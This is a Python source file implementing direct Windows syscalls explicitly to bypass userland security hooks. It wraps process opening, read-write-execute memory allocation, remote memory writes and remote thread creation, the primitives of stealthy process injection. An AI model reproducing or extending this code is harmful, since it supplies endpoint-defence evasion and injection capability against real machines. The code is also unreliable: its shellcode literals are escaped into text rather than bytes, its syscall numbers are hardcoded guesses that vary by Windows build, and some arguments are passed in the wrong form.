#!/usr/bin/env python3
"""
Direct Syscalls Implementation
Bypass userland hooks by calling Windows syscalls directly
"""

import ctypes
import struct
import sys
import os
from ctypes import wintypes
from typing import Dict, Any, Optional

class DirectSyscalls:
    """Bypass userland hooks by calling syscalls directly"""
    
    def __init__(self):
        self.syscall_numbers: Dict[str, int] = {}
        self.syscall_shellcode: Dict[str, bytes] = {}
        
        if sys.platform == 'win32':
            self._initialize_syscalls()
    
    def _initialize_syscalls(self):
        """Initialize syscall numbers for current Windows version"""
        
        # Get Windows version to determine correct syscall numbers
        version = sys.getwindowsversion()
        
        # Syscall numbers vary by Windows version
        # These are for Windows 10/11 x64
        if version.major == 10:
            self.syscall_numbers = {
                'NtCreateFile': 0x55,
                'NtReadFile': 0x6,
                'NtWriteFile': 0x8,
                'NtClose': 0xF,
                'NtOpenProcess': 0x26,
                'NtTerminateProcess': 0x2C,
                'NtQuerySystemInformation': 0x36,
                'NtAllocateVirtualMemory': 0x18,
                'NtFreeVirtualMemory': 0x1E,
                'NtProtectVirtualMemory': 0x50,
                'NtCreateThread': 0x4E,
                'NtResumeThread': 0x52,
                'NtSuspendThread': 0x1FB,
                'NtQueryInformationProcess': 0x19,
                'NtSetInformationProcess': 0x1C,
                'NtCreateSection': 0x4A,
                'NtMapViewOfSection': 0x28,
                'NtUnmapViewOfSection': 0x2A,
                'NtCreateProcessEx': 0x4D,
                'NtCreateThreadEx': 0xC1,
                'NtWriteVirtualMemory': 0x3A,
                'NtReadVirtualMemory': 0x3F,
                'NtFlushInstructionCache': 0xD8,
                'NtQueryVirtualMemory': 0x23
            }
        else:
            # Default values - would need to be updated for other versions
            self.syscall_numbers = {
                'NtCreateFile': 0x55,
                'NtReadFile': 0x6,
                'NtWriteFile': 0x8,
                'NtClose': 0xF,
                'NtOpenProcess': 0x26,
                'NtTerminateProcess': 0x2C,
                'NtQuerySystemInformation': 0x36
            }
        
        # Pre-generate syscall shellcode
        self._generate_syscall_shellcode()
    
    def _generate_syscall_shellcode(self):
        """Generate syscall shellcode for each function"""
        
        for func_name, syscall_num in self.syscall_numbers.items():
            # x64 syscall shellcode template:
            # MOV R10, RCX    ; Move first parameter to R10
            # MOV EAX, <num>  ; Move syscall number to EAX
            # SYSCALL         ; Execute syscall
            # RET             ; Return
            
            shellcode = (
                b'\\x4C\\x8B\\xD1' +  # MOV R10, RCX
                b'\\xB8' + struct.pack('<I', syscall_num) +  # MOV EAX, syscall_num
                b'\\x0F\\x05' +  # SYSCALL
                b'\\xC3'  # RET
            )
            
            self.syscall_shellcode[func_name] = shellcode
    
    def _execute_syscall(self, func_name: str, *args) -> int:
        """Execute a direct syscall"""
        
        if sys.platform != 'win32':
            raise OSError("Direct syscalls only supported on Windows")
        
        if func_name not in self.syscall_shellcode:
            raise ValueError(f"Syscall {func_name} not available")
        
        shellcode = self.syscall_shellcode[func_name]
        
        # Allocate executable memory
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40
        
        kernel32 = ctypes.windll.kernel32
        addr = kernel32.VirtualAlloc(
            0, len(shellcode), 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_EXECUTE_READWRITE
        )
        
        if not addr:
            raise OSError("Failed to allocate executable memory")
        
        try:
            # Write shellcode to allocated memory
            ctypes.memmove(addr, shellcode, len(shellcode))
            
            # Create function prototype
            # All syscalls return NTSTATUS (LONG)
            if len(args) == 0:
                func_type = ctypes.WINFUNCTYPE(ctypes.c_long)
            else:
                param_types = [ctypes.c_void_p] * len(args)
                func_type = ctypes.WINFUNCTYPE(ctypes.c_long, *param_types)
            
            # Create function and call it
            func = func_type(addr)
            result = func(*args)
            
            return result
            
        finally:
            # Free allocated memory
            kernel32.VirtualFree(addr, 0, 0x8000)  # MEM_RELEASE
    
    def nt_create_file(self, path: str, desired_access: int = 0x80000000) -> Dict[str, Any]:
        """Direct syscall for NtCreateFile"""
        
        try:
            # Prepare UNICODE_STRING for path
            path_unicode = path.encode('utf-16le')
            
            # Prepare parameters
            handle = ctypes.c_void_p()
            
            # Object attributes structure (simplified)
            object_attributes = ctypes.create_string_buffer(48)  # OBJECT_ATTRIBUTES size
            
            # IO status block
            io_status = ctypes.create_string_buffer(16)  # IO_STATUS_BLOCK size
            
            # Execute syscall
            status = self._execute_syscall(
                'NtCreateFile',
                ctypes.byref(handle),
                desired_access,
                ctypes.byref(object_attributes),
                ctypes.byref(io_status),
                0,  # AllocationSize
                0,  # FileAttributes
                0,  # ShareAccess
                1,  # CreateDisposition (FILE_OPEN)
                0,  # CreateOptions
                0,  # EaBuffer
                0   # EaLength
            )
            
            return {
                'success': status == 0,
                'handle': handle.value if status == 0 else None,
                'status': status,
                'path': path
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'path': path
            }
    
    def nt_query_system_information(self, info_class: int) -> Dict[str, Any]:
        """Direct syscall for NtQuerySystemInformation"""
        
        try:
            # Allocate buffer for system information
            buffer_size = 0x10000  # 64KB initial buffer
            buffer = ctypes.create_string_buffer(buffer_size)
            return_length = ctypes.c_ulong()
            
            # Execute syscall
            status = self._execute_syscall(
                'NtQuerySystemInformation',
                info_class,
                buffer,
                buffer_size,
                ctypes.byref(return_length)
            )
            
            if status == 0:
                # Parse the returned data based on info_class
                data = bytes(buffer.raw[:return_length.value])
                
                return {
                    'success': True,
                    'status': status,
                    'info_class': info_class,
                    'data': data,
                    'size': return_length.value
                }
            else:
                return {
                    'success': False,
                    'status': status,
                    'info_class': info_class,
                    'error': f'NtQuerySystemInformation failed with status 0x{status:08X}'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'info_class': info_class
            }
    
    def nt_open_process(self, pid: int, desired_access: int = 0x1F0FFF) -> Dict[str, Any]:
        """Direct syscall for NtOpenProcess"""
        
        try:
            handle = ctypes.c_void_p()
            
            # Object attributes (can be NULL for process)
            object_attributes = ctypes.c_void_p()
            
            # Client ID structure
            client_id = struct.pack('<QQ', pid, 0)  # PID, TID (0 for process)
            
            # Execute syscall
            status = self._execute_syscall(
                'NtOpenProcess',
                ctypes.byref(handle),
                desired_access,
                ctypes.byref(object_attributes),
                client_id
            )
            
            return {
                'success': status == 0,
                'handle': handle.value if status == 0 else None,
                'status': status,
                'pid': pid
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'pid': pid
            }
    
    def nt_allocate_virtual_memory(self, process_handle: int, size: int, 
                                 allocation_type: int = 0x3000, 
                                 protect: int = 0x40) -> Dict[str, Any]:
        """Direct syscall for NtAllocateVirtualMemory"""
        
        try:
            base_address = ctypes.c_void_p()
            region_size = ctypes.c_size_t(size)
            
            # Execute syscall
            status = self._execute_syscall(
                'NtAllocateVirtualMemory',
                process_handle,
                ctypes.byref(base_address),
                0,  # ZeroBits
                ctypes.byref(region_size),
                allocation_type,
                protect
            )
            
            return {
                'success': status == 0,
                'address': base_address.value if status == 0 else None,
                'size': region_size.value,
                'status': status
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }
    
    def nt_write_virtual_memory(self, process_handle: int, base_address: int, 
                              data: bytes) -> Dict[str, Any]:
        """Direct syscall for NtWriteVirtualMemory"""
        
        try:
            buffer = ctypes.create_string_buffer(data)
            bytes_written = ctypes.c_size_t()
            
            # Execute syscall
            status = self._execute_syscall(
                'NtWriteVirtualMemory',
                process_handle,
                base_address,
                buffer,
                len(data),
                ctypes.byref(bytes_written)
            )
            
            return {
                'success': status == 0,
                'bytes_written': bytes_written.value,
                'status': status
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }
    
    def nt_create_thread_ex(self, process_handle: int, start_address: int, 
                          parameter: int = 0) -> Dict[str, Any]:
        """Direct syscall for NtCreateThreadEx"""
        
        try:
            thread_handle = ctypes.c_void_p()
            
            # Execute syscall (simplified parameters)
            status = self._execute_syscall(
                'NtCreateThreadEx',
                ctypes.byref(thread_handle),
                0x1FFFFF,  # THREAD_ALL_ACCESS
                0,  # ObjectAttributes
                process_handle,
                start_address,
                parameter,
                0,  # CreateFlags
                0,  # ZeroBits
                0,  # StackSize
                0,  # MaximumStackSize
                0   # AttributeList
            )
            
            return {
                'success': status == 0,
                'handle': thread_handle.value if status == 0 else None,
                'status': status
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }
    
    def get_available_syscalls(self) -> list:
        """Get list of available syscalls"""
        return list(self.syscall_numbers.keys())
    
    def test_syscall_functionality(self) -> Dict[str, Any]:
        """Test syscall functionality"""
        
        results = {
            'platform_supported': sys.platform == 'win32',
            'syscalls_loaded': len(self.syscall_numbers),
            'shellcode_generated': len(self.syscall_shellcode),
            'test_results': {}
        }
        
        if sys.platform == 'win32':
            # Test NtQuerySystemInformation (safe syscall)
            try:
                result = self.nt_query_system_information(0)  # SystemBasicInformation
                results['test_results']['NtQuerySystemInformation'] = result['success']
            except Exception as e:
                results['test_results']['NtQuerySystemInformation'] = False
                results['test_error'] = str(e)
        
        return results


def create_direct_syscalls():
    """Factory function to create direct syscalls interface"""
    return DirectSyscalls()


if __name__ == "__main__":
    # print("Testing Direct Syscalls Implementation...")
    
    syscalls = create_direct_syscalls()
    
    # Test functionality
    test_results = syscalls.test_syscall_functionality()
    
    # print(f"Platform supported: {test_results['platform_supported']}")
    # print(f"Syscalls loaded: {test_results['syscalls_loaded']}")
    # print(f"Available syscalls: {syscalls.get_available_syscalls()}")
    
    if test_results['platform_supported']:
        pass
    # print("Test results:", test_results['test_results'])
        
        if any(test_results['test_results'].values()):
            pass
    # print("✅ Direct syscalls working correctly")
        else:
            pass
    # print("⚠️ Direct syscalls may need administrator privileges to test fully")
    else:
        pass
    # print("ℹ️ Direct syscalls only supported on Windows")
    
    # print("Direct syscalls implementation complete")